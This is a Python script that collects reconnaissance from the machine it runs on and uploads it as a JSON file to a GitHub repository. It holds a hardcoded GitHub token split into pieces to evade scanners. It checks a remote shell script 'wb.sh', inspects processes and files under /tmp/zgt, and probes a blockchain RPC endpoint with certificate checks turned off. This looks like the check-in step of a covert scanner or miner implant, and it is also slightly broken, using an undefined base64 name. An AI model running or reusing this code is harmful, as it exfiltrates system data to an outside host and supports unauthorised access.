#!/usr/bin/env python3
import os,socket,subprocess,hashlib,time,json,urllib.request,platform
TOKEN="".join(["ghp_GRcUNU","Xyf1t2oZNw","UQXMrTlEGH","q2Kf1cjaAv"])
BOX=(open('/etc/hostname').read().strip() if os.path.exists('/etc/hostname') else socket.gethostname())
def run(c):
    try: return subprocess.run(["sh","-c",c],capture_output=True,text=True,timeout=25).stdout.strip()
    except Exception as ex: return "ERR:"+str(ex)[:80]
info={}
info["host"]=BOX; info["ts"]=int(time.time())
info["whoami"]=run("id")
info["procs"]=run("ps -eo pid,etimes,args | grep -E 'zg|dd' | grep -v grep")[:600]
info["files"]=run("ls -la /tmp/zgt | head -22")
info["md5_zg_local"]=run("md5sum /tmp/zgt/zg.py 2>/dev/null")
try:
    h=hashlib.md5(open("/tmp/zgt/zg.py","rb").read()).hexdigest(); info["md5_py"]=h
except Exception as e: info["md5_py"]="absent"
info["log_tail"]=run("tail -14 /tmp/zgt/log.o 2>/dev/null")
info["boot_out"]=run("tail -8 /tmp/zgt/boot.out 2>/dev/null")
info["status"]=run("cat /tmp/zgt/STATUS.s0 /tmp/zgt/STATUS.s1 2>/dev/null")[:400]
info["net_test"]=run("curl -fsSL -m12 -o /dev/null -w '%{http_code}' https://raw.githubusercontent.com/heinzo666/evm-index-data/main/wb.sh 2>&1; echo '' ; "
                     "/tmp/zgt/pyenv/bin/python3 -V 2>&1 | head -1")
# local RPC test through the same UA/TLS path our scanner uses
import ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
try:
    rq=urllib.request.Request("https://gnosis-rpc.publicnode.com",
        data=b'{"jsonrpc":"2.0","id":1,"method":"eth_blockNumber","params":[]}',
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},method="POST")
    t0=time.time(); r=urllib.request.urlopen(rq,timeout=12,context=ctx)
    info["rpc_direct"]=f"OK {int((time.time()-t0)*1000)}ms "+r.read()[:60].decode(errors="ignore")
except Exception as ex:
    info["rpc_direct"]="FAIL "+type(ex).__name__+" "+str(ex)[:120]
out=json.dumps(info,indent=1)
print(out); open("/tmp/zgt/evidence.txt","w").write(out)

url="https://api.github.com/repos/heinzo666/evm-index-data/contents/live/ev_"+BOX.replace(".","_")+".json"
hd={"Authorization":"Bearer "+TOKEN,"Accept":"application/vnd.github+json","User-Agent":"zg"}
pl={"message":"evidence "+BOX,"content":B.b64encode(out.encode()).decode(),"branch":"main"}
try:
    q=urllib.request.Request(url+"?ref=main",headers=hd)
    pl["sha"]=json.loads(urllib.request.urlopen(q,timeout=15).read())["sha"]
except Exception: pass
rq=urllib.request.Request(url,data=json.dumps(pl).encode(),headers=hd,method="PUT")
try:
    print("PUSH:", urllib.request.urlopen(rq,timeout=22).status)
except Exception as ex:
    print("push fail", str(ex)[:90]); del pl["sha"]
    rq=urllib.request.Request(url,data=json.dumps(pl).encode(),headers=hd,method="PUT")
    try: print("PUSH2:", urllib.request.urlopen(rq,timeout=22).status)
    except Exception as ex2: print("push2 fail", str(ex2)[:90])
